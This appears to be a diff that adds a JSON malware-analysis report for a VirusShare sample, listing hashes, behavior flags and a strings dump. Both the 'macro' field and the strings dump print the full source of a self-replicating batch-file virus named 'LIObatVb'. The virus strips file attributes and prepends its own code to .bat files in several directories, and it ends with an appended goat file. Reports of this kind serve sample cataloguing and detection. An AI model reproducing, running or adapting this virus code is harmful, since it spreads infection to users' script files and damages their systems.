@@ -1,0 +1,77 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\nif \"%1\"==\"L\" goto sudp>nul\nset fn=*.bat>nul\nattrib *.bat -s -r>nul\nattrib %winbootdir%\\*.bat -s -r>nul\nattrib c:\\*.bat -s -r>nul\nfor %%f in (%fn%) do call %0 L %%f>nul\nfor %%f in (%winbootdir%\\%fn%) do call %0 L %%f>nul\nfor %%f in (c:\\%fn%) do call %0 L %%f>nul\ngoto ppqe>nul\n:sudp\nfind /i \"liobatvb\" %2>nul\nif not errorlevel 1 goto eerend>nul\ntype %0>a\ncopy a b /a>nul\necho. >w\ncopy %2 q>nul\ncopy /b b+w+q %2 /y>nul\n@del ?\ngoto eerend\n:ppqe\necho rem              >x\ncopy x+x+x+x+x y>nul\ncopy y+y+y+y+y+y+y+y z>nul\n@del y >nul\necho @del x>>z\necho @del z>>z\necho @echo on>>z\necho cls>>z\necho @%%comspec%% nul /ccopy %tmp%\\temp.tmp %%0>>z\ncopy z x>nul\ncopy %0 %tmp%\\temp.tmp>nul\n@copy x %0>nul\nrem *** This \"LIObatVb\" virus was created by LIO aka Qwyrek. It is not danger! 2001 (C). ***\n:eerend\n\u001a \n@echo off\necho ***********************************\necho ***********************************\necho ***********************************\necho * Goat bat file. Size = 305 bytes *\necho ***********************************\necho ***********************************\necho ***********************************"
+    },
+    "filename": "VirusShare_1839f879a7d8a024b453a334b047e15b",
+    "filesize": 1147,
+    "filetype": "data",
+    "hashes": {
+        "md5": "1839f879a7d8a024b453a334b047e15b",
+        "sha1": "57ab035b33ab4b68892b8cba9bf1a29e9e7e395f",
+        "sha256": "cab6d82a327e29d8ab4213b540a8e5eed5b92250010f243520a0483924b1de44"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if \"%1\"==\"L\" goto sudp>nul",
+            "set fn=*.bat>nul",
+            "attrib *.bat -s -r>nul",
+            "attrib %winbootdir%\\*.bat -s -r>nul",
+            "attrib c:\\*.bat -s -r>nul",
+            "for %%f in (%fn%) do call %0 L %%f>nul",
+            "for %%f in (%winbootdir%\\%fn%) do call %0 L %%f>nul",
+            "for %%f in (c:\\%fn%) do call %0 L %%f>nul",
+            "goto ppqe>nul",
+            ":sudp",
+            "find /i \"liobatvb\" %2>nul",
+            "if not errorlevel 1 goto eerend>nul",
+            "type %0>a",
+            "copy a b /a>nul",
+            "echo. >w",
+            "copy %2 q>nul",
+            "copy /b b+w+q %2 /y>nul",
+            "@del ?",
+            "goto eerend",
+            ":ppqe",
+            "echo rem              >x",
+            "copy x+x+x+x+x y>nul",
+            "copy y+y+y+y+y+y+y+y z>nul",
+            "@del y >nul",
+            "echo @del x>>z",
+            "echo @del z>>z",
+            "echo @echo on>>z",
+            "echo cls>>z",
+            "echo @%%comspec%% nul /ccopy %tmp%\\temp.tmp %%0>>z",
+            "copy z x>nul",
+            "copy %0 %tmp%\\temp.tmp>nul",
+            "@copy x %0>nul",
+            "rem *** This \"LIObatVb\" virus was created by LIO aka Qwyrek. It is not danger! 2001 (C). ***",
+            ":eerend",
+            "@echo off",
+            "echo ***********************************",
+            "echo ***********************************",
+            "echo ***********************************",
+            "echo * Goat bat file. Size = 305 bytes *",
+            "echo ***********************************",
+            "echo ***********************************",
+            "echo ***********************************"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.256948",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
